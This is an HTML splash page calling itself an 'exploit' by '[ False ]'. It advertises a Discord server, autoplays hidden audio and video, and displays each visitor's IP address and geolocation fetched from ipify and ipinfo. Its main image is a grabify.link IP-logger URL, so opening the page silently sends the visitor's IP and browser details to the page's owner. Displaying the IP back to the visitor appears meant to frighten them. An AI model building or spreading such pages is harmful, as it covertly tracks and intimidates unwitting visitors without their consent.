<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>False Expolit</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            color: #ffffff;
            background-color: #000000;
            overflow: hidden;
        }

        .animated-text {
            font-size: 2em;
            font-weight: bold;
            text-shadow: 0 0 10px #ff0000, 0 0 20px rgb(174, 0, 255), 0 0 30px #0000ff;
            animation: nameGlowing 3s infinite alternate;
        }

        @keyframes nameGlowing {
            0% { color: rgb(174, 0, 255); text-shadow: 0 0 10px rgb(174, 0, 255), 0 0 20px #ffffff; }
            100% { color: white; text-shadow: 0 0 20px #ff0000, 0 0 30px #0000ff; }
        }

        #name {
            font-size: 3em;
            font-weight: bold;
            text-shadow: 0 0 10px rgb(174, 0, 255), 0 0 20px #ffffff;
            animation: nameGlowing 3s infinite alternate;
        }

        .discord-link {
            font-size: 1.5em;
            text-decoration: none;
            font-weight: bold;
            text-shadow: 0 0 10px rgb(174, 0, 255), 0 0 20px #ffffff;
            animation: nameGlowing 3s infinite alternate;
        }

        .discord-link span {
            text-shadow: 0 0 10px #ff0000, 0 0 20px #0000ff;
            animation: nameGlowing 3s infinite alternate;
        }

        .cmd-text {
            font-size: 1.2em;
            font-family: 'Courier New', Courier, monospace;
            animation: scrollText 20s linear infinite, nameGlowing 3s infinite alternate;
            text-shadow: 0 0 10px #ff0000, 0 0 20px rgb(174, 0, 255);
        }

        @keyframes scrollText {
            0% { transform: translateX(100%); }
            100% { transform: translateX(-100%); }
        }

        .ip-info {
            font-family: Arial, sans-serif;
            white-space: pre;
            background-color: #1c1c1c;
            padding: 10px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgb(174, 0, 255);
            animation: nameGlowing 3s infinite alternate;
        }

        video {
            position: fixed;
            top: 0;
            left: 0;
            z-index: -1;
            width: 100%;
            height: 100%;
            filter: blur(2px); /* تقليل البلور */
            object-fit: cover;
        }
    </style>
</head>
<body>
    <video autoplay loop muted>
        <source src="https://cdn.discordapp.com/attachments/1112451288052007025/1271861425803104407/08101.mp4?ex=66b8e0c1&is=66b78f41&hm=344e4dde3afe38615938ad94268a8cceedbfde6598496068553139f4da7056c1&">
        Your browser does not support the video element.
    </video>

    <script>
        var names = [
            { name: "[ False ]", color: "" },
        ];

        var nameIndex = 0;

        function changeNames() {
            var currentName = names[nameIndex];
            document.getElementById("name").textContent = currentName.name;
            document.getElementById("name").style.color = currentName.color;
            document.querySelectorAll('.animated-text, .discord-link, .cmd-text, .ip-info').forEach(function(el) {
                el.style.color = currentName.color;
            });
            nameIndex = (nameIndex + 1) % names.length;
        }

        // Change the names and colors every 1 second
        setInterval(changeNames, 1000);
    </script>

    <p align="center">
        <img border="0" src="https://grabify.link/K13QTH" width="500" height="425">
    </p>
    <p align="center">
        <font face="Courier" size="6" style="color: #000000;">
            <span class="animated-text">Expolit By  </span>
            <span id="name"></span>
        </font>
    </p>
    <p align="center">
        <b>
        <font face="Courier" color="#000000">
            <a href="https://discord.gg/mefirst" class="discord-link">Discord.gg/<span>mefirst</span></a>
        </font>
        </b>
    </p>
    

    <p id="ip-address">
        <span id="ip-address-value" style="color: rgb(174, 0, 255); font-size: 17px;">Loading...</span>
    </p>
    <h3 class="animated-text">Your IP Info :</h3>
    <pre id="ip-info" class="ip-info">Fetching...</pre>


    <!-- Hidden audio element with autoplay -->
    <audio autoplay loop style="display: none;">
        <source src="https://cdn.discordapp.com/attachments/1112451288052007025/1271861404093120523/08102.mp3?ex=66b8e0bc&is=66b78f3c&hm=065c3a7c159575b5e82882ebf4761c34f7785fc27fbc6546573001015c0b45d5&" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>

    <script>
        // JavaScript code to fetch and display the user's IP address and information
        function fetchIPAndInfo() {
            fetch('https://api.ipify.org/?format=json')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('ip-address-value').textContent = data.ip;
                    return data.ip;
                })
                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
                .then(response => response.json())
                .then(ipInfoData => {
                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
                });
        }

        // Fetch IP address and information initially
        fetchIPAndInfo();
    </script>
</body>
</html>
